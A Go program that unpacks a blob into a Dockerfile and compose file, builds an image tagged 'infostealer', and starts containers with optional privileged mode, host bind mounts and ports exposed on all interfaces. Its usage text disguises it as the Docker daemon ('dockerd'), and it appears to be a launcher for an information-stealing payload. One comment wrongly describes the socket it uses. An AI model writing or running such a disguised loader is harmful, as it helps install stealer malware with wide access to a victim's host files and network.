package main

import (
	"archive/tar"
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/api/types/mount"
	"github.com/docker/docker/client"
	"github.com/docker/go-connections/nat"
	"gopkg.in/yaml.v3"
)

const defaultImage = "infostealer:latest"

type compose struct {
	Services map[string]struct {
		Image         string   `yaml:"image"`
		ContainerName string   `yaml:"container_name"`
		Privileged    bool     `yaml:"privileged"`
		Volumes       []string `yaml:"volumes"`
		Ports         []string `yaml:"ports"`
	} `yaml:"services"`
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./dockerd docker-init")
		os.Exit(1)
	}
	blobPath := os.Args[1]
	raw, err := os.ReadFile(blobPath)
	check(err)

	if len(raw) < 8 {
		die("invalid blob format: file is too short")
	}

	dfLen := binary.BigEndian.Uint32(raw[0:4])
	dcLen := binary.BigEndian.Uint32(raw[4:8])
	if int(8+dfLen+dcLen) != len(raw) {
		die("blob length mismatch: got %d, expected %d", len(raw), 8+dfLen+dcLen)
	}

	dockerfile := string(raw[8 : 8+dfLen])
	composeYML := string(raw[8+dfLen : 8+dfLen+dcLen])

	// Use TCP Docker API (good for macOS)
	cli, err := client.NewClientWithOpts(
		client.WithHost("unix:///var/run/docker.sock"),
		client.WithAPIVersionNegotiation(),
	)
	check(err)

	ctx := context.Background()

	// Build the image
	tarBuf := new(bytes.Buffer)
	tw := tar.NewWriter(tarBuf)
	check(tw.WriteHeader(&tar.Header{Name: "Dockerfile", Mode: 0600, Size: int64(len(dockerfile))}))
	_, _ = tw.Write([]byte(dockerfile))
	tw.Close()

	buildResp, err := cli.ImageBuild(ctx, tarBuf, types.ImageBuildOptions{
		Dockerfile:  "Dockerfile",
		Tags:        []string{defaultImage},
		Remove:      true,
		ForceRemove: true,
	})
	check(err)
	io.Copy(io.Discard, buildResp.Body)
	buildResp.Body.Close()
	fmt.Println("✅ Docker image built.")

	// Parse docker-compose section
	var comp compose
	check(yaml.Unmarshal([]byte(composeYML), &comp))

	for name, svc := range comp.Services {
		fmt.Println("▶ Creating container:", name)

		var mounts []mount.Mount
		for _, v := range svc.Volumes {
			if pair := strings.SplitN(v, ":", 2); len(pair) == 2 {
				mounts = append(mounts, mount.Mount{
					Type:   mount.TypeBind,
					Source: pair[0],
					Target: pair[1],
				})
			}
		}

		portMap, err := natBindings(svc.Ports)
		check(err)

		resp, err := cli.ContainerCreate(ctx,
			&container.Config{
				Image: choose(svc.Image, defaultImage),
			},
			&container.HostConfig{
				Privileged:   svc.Privileged,
				Mounts:       mounts,
				PortBindings: portMap,
			},
			nil, nil,
			choose(svc.ContainerName, name),
		)
		check(err)

		check(cli.ContainerStart(ctx, resp.ID, container.StartOptions{}))
		fmt.Printf("✅ Container %s started (%s)\n", name, resp.ID[:12])
	}
}

func natBindings(ports []string) (nat.PortMap, error) {
	portMap := make(nat.PortMap)
	for _, p := range ports {
		parts := strings.SplitN(p, ":", 2)
		if len(parts) != 2 {
			continue
		}
		hostPort := parts[0]
		containerPort := parts[1]
		if !strings.Contains(containerPort, "/") {
			containerPort += "/tcp"
		}
		port, err := nat.NewPort("tcp", strings.TrimSuffix(containerPort, "/tcp"))
		if err != nil {
			return nil, fmt.Errorf("invalid port format: %s", containerPort)
		}
		portMap[port] = []nat.PortBinding{
			{
				HostIP:   "0.0.0.0",
				HostPort: hostPort,
			},
		}
	}
	return portMap, nil
}

func choose(s, fallback string) string {
	if strings.TrimSpace(s) == "" {
		return fallback
	}
	return s
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

func die(format string, a ...interface{}) {
	fmt.Fprintf(os.Stderr, "fatal: "+format+"\n", a...)
	os.Exit(1)
}